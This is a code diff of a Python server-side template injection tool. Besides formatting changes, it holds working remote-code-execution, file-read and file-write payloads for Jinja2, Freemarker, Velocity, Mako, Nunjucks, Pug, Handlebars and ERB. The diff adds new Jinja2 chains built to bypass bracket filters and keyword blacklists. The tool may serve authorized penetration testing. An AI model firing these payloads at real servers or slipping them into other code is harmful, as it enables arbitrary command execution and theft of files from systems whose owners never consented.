@@ -6,8 +6,8 @@ across 16+ template engines including Nunjucks, Pug, Tera, Go templates, and EJS
 """
 
 import json
-import re
 from typing import Dict, List, Optional, Tuple
+
 import requests
 
 
@@ -50,9 +50,9 @@ class SstiProbeTool:
         ("#{7*7}", "49"),
         ("<%= 7*7 %>", "49"),
         ("{{7*'7'}}", "7777777"),  # Jinja2/Twig string multiplication
-        ("${7*'7'}", "7777777"),   # Some engines
+        ("${7*'7'}", "7777777"),  # Some engines
         # Alternative syntax
-        ("[[7*7]]", "49"),         # Some custom delimiters
+        ("[[7*7]]", "49"),  # Some custom delimiters
         ("{%25 print 7*7 %25}", "49"),  # URL-encoded Jinja2
     ]
 
@@ -75,7 +75,11 @@ class SstiProbeTool:
             ("${.version}", ".", "Freemarker (Java)"),
             ("${.now}", "20", "Freemarker (Java)"),
             ("<#assign x=7*7>${x}", "49", "Freemarker (Java)"),
-            ("${\"freemarker.template.utility.Execute\"?new()}", "Execute", "Freemarker (Java)"),
+            (
+                '${"freemarker.template.utility.Execute"?new()}',
+                "Execute",
+                "Freemarker (Java)",
+            ),
         ],
         "erb": [
             ("<%= self %>", "#<", "ERB (Ruby)"),
@@ -117,7 +121,7 @@ class SstiProbeTool:
             ("{{ 7 * 7 }}", "49", "Tera (Rust)"),
         ],
         "go_template": [
-            ("{{printf \"%d\" 49}}", "49", "Go html/template"),
+            ('{{printf "%d" 49}}', "49", "Go html/template"),
             ("{{7}}", "7", "Go html/template"),
         ],
         "ejs": [
@@ -139,8 +143,8 @@ class SstiProbeTool:
             "{{app.request.server.get('DOCUMENT_ROOT')}}",
         ],
         "freemarker": [
-            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
-            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
+            '${"freemarker.template.utility.Execute"?new()("id")}',
         ],
         "erb": [
             "<%= `id` %>",
@@ -152,14 +156,14 @@ class SstiProbeTool:
             "{Smarty_Internal_Write_File::writeFile('/tmp/pwned','test',self::clearConfig())}",
         ],
         "velocity": [
-            "#set($e=\"\")$e.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")",
+            '#set($e="")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")',
         ],
         "mako": [
             "<%! import os %>${os.popen('id').read()}",
             "${__import__('os').popen('id').read()}",
         ],
         "nunjucks": [
-            "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
+            '{{range.constructor(\'return global.process.mainModule.require("child_process").execSync("id")\')()}}',
         ],
         "pug": [
             "-var x = global.process.mainModule.require('child_process').execSync('id')\n=x",
@@ -191,7 +195,9 @@ class SstiProbeTool:
         if not param:
             return "[SstiProbeTool] Error: 'param' is required."
         if method not in ["GET", "POST"]:
-            return f"[SstiProbeTool] Error: 'method' must be GET or POST, got '{method}'."
+            return (
+                f"[SstiProbeTool] Error: 'method' must be GET or POST, got '{method}'."
+            )
 
         try:
             return self._probe_ssti(url, method, param, extra_data, headers, timeout)
@@ -213,7 +219,9 @@ class SstiProbeTool:
         """Make request with payload injected into parameter."""
         request_data = {param: payload, **extra_data}
         if method == "GET":
-            return self.session.get(url, params=request_data, headers=headers, timeout=timeout)
+            return self.session.get(
+                url, params=request_data, headers=headers, timeout=timeout
+            )
         else:
             # Detect JSON content type
             content_type = ""
@@ -222,9 +230,13 @@ class SstiProbeTool:
                     content_type = v.lower()
                     break
             if "application/json" in content_type:
-                return self.session.post(url, json=request_data, headers=headers, timeout=timeout)
+                return self.session.post(
+                    url, json=request_data, headers=headers, timeout=timeout
+                )
             else:
-                return self.session.post(url, data=request_data, headers=headers, timeout=timeout)
+                return self.session.post(
+                    url, data=request_data, headers=headers, timeout=timeout
+                )
 
     def _probe_ssti(
         self,
@@ -286,9 +298,11 @@ class SstiProbeTool:
                     if expected in resp.text:
                         vulnerable = True
                         detected_engines.add(engine)
-                        results.append(f"[+] {engine_name}: {probe} => Found '{expected}'")
-                except Exception:
-                    pass  # Silently skip errors for engine probes
+                        results.append(
+                            f"[+] {engine_name}: {probe} => Found '{expected}'"
+                        )
+                except Exception as e:
+                    results.append(f"[!] Error probing {engine}: {e}")
 
         results.append("")
 
@@ -327,8 +341,8 @@ class SstiProbeTool:
                     if indicator.lower() in resp.text.lower():
                         detected_engines.add(engine.lower())
                         results.append(f"[+] Error reveals {engine}: {indicator}")
-            except Exception:
-                pass
+            except Exception as e:
+                results.append(f"[!] Error probing {engine}: {e}")
 
         results.append("")
 
@@ -349,7 +363,9 @@ class SstiProbeTool:
             for engine in detected_engines:
                 if engine in self.RCE_EXPLOITS:
                     results.append(f"\n--- {engine.upper()} ---")
-                    for exploit in self.RCE_EXPLOITS[engine][:2]:  # Limit to 2 per engine
+                    for exploit in self.RCE_EXPLOITS[engine][
+                        :2
+                    ]:  # Limit to 2 per engine
                         results.append(f"  {exploit}")
 
         return "\n".join(results)
@@ -375,16 +391,26 @@ class SstiExploitSuggester:
     PAYLOADS: Dict[str, Dict[str, List[str]]] = {
         "jinja2": {
             "rce": [
-                "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
-                "{{''.__class__.__mro__[2].__subclasses__()[40]('{cmd}').read()}}",
-                "{{request.application.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
+                # Direct attribute access (no bracket indexing — works when [] is blocked)
                 "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
+                "{{joiner.__init__.__globals__.os.popen('{cmd}').read()}}",
+                "{{namespace.__init__.__globals__.os.popen('{cmd}').read()}}",
+                # Bracket indexing variants (when [] is allowed)
+                "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
                 "{{lipsum.__globals__['os'].popen('{cmd}').read()}}",
+                # Via request object
+                "{{request.application.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
+                # Subclass chain (when direct globals access is filtered)
+                "{{''.__class__.__mro__[2].__subclasses__()[40]('{cmd}').read()}}",
+                # Loop-based WAF bypass
                 "{{% for x in ().__class__.__base__.__subclasses__() %}}{{% if 'warning' in x.__name__ %}}{{x()._module.__builtins__['__import__']('os').popen('{cmd}').read()}}{{% endif %}}{{% endfor %}}",
+                # Attr-filter bypass for keyword blacklists (split dangerous strings)
+                "{{(cycler|attr('__in'~'it__')|attr('__glo'~'bals__')).os.popen('{cmd}').read()}}",
             ],
             "file_read": [
-                "{{''.__class__.__mro__[2].__subclasses__()[40]('{file}').read()}}",
+                "{{cycler.__init__.__globals__.os.popen('cat {file}').read()}}",
                 "{{config.__class__.__init__.__globals__['os'].popen('cat {file}').read()}}",
+                "{{''.__class__.__mro__[2].__subclasses__()[40]('{file}').read()}}",
             ],
             "info": [
                 "{{config}}",
@@ -413,12 +439,12 @@ class SstiExploitSuggester:
         },
         "freemarker": {
             "rce": [
-                "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${{ex(\"{cmd}\")}}",
-                "${{\"freemarker.template.utility.Execute\"?new()(\"{cmd}\")}}",
+                '<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("{cmd}")}}',
+                '${{"freemarker.template.utility.Execute"?new()("{cmd}")}}',
                 "[#assign ex='freemarker.template.utility.Execute'?new()]${{ex('{cmd}')}}",
             ],
             "file_read": [
-                "<#include \"{file}\">",
+                '<#include "{file}">',
                 "<#assign content = .data_model['freemarker.template.utility.ObjectConstructor']?new()><#assign file = content('java.io.FileReader', '{file}')><#assign scanner = content('java.util.Scanner', file)>${{scanner.useDelimiter('\\\\Z').next()}}",
             ],
             "info": [
@@ -528,7 +554,7 @@ class SstiExploitSuggester:
         "nunjucks": {
             "rce": [
                 "{{% set proc = global.process %}}{{% set spawn = proc.mainModule.require('child_process').execSync %}}{{{{spawn('{cmd}')}}}}",
-                "{{{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"{cmd}\")')()}}}}",
+                '{{{{range.constructor(\'return global.process.mainModule.require("child_process").execSync("{cmd}")\')()}}}}',
             ],
             "info": [
                 "{{range.constructor('return this')()}}",
@@ -537,7 +563,7 @@ class SstiExploitSuggester:
         },
         "handlebars": {
             "rce": [
-                "{{{{#with \"s\" as |string|}}}}{{{{#with \"e\"}}}}{{{{#with split as |conslist|}}}}{{{{this.pop}}}}{{{{this.push (lookup string.sub \"constructor\")}}}}{{{{this.pop}}}}{{{{#with string.split as |codelist|}}}}{{{{this.pop}}}}{{{{this.push \"return require('child_process').execSync('{cmd}')\"}}}}{{{{this.pop}}}}{{{{#each conslist}}}}{{{{#with (string.sub.apply 0 codelist)}}}}{{{{this}}}}{{{{/with}}}}{{{{/each}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}",
+                '{{{{#with "s" as |string|}}}}{{{{#with "e"}}}}{{{{#with split as |conslist|}}}}{{{{this.pop}}}}{{{{this.push (lookup string.sub "constructor")}}}}{{{{this.pop}}}}{{{{#with string.split as |codelist|}}}}{{{{this.pop}}}}{{{{this.push "return require(\'child_process\').execSync(\'{cmd}\')"}}}}{{{{this.pop}}}}{{{{#each conslist}}}}{{{{#with (string.sub.apply 0 codelist)}}}}{{{{this}}}}{{{{/with}}}}{{{{/each}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}',
             ],
             "info": [
                 "{{this}}",
@@ -572,7 +598,7 @@ class SstiExploitSuggester:
             ],
             "info": [
                 "{{{{.}}}}",
-                "{{{{printf \"%v\" .}}}}",
+                '{{{{printf "%v" .}}}}',
             ],
         },
         "ejs": {
